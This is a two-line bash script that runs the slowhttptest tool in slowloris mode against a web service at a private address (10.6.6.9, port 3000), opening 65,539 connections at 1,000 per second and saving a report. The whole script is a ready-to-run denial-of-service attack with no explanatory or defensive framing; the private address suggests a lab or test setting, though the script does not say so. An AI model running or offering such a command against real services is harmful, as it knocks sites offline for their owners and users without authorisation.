#!/bin/bash

slowhttptest -c 65539 -H -g -o report-slowloris -i 1 -r 1000 -t GET -u 'http://10.6.6.9:3000' -x 24 -p 3
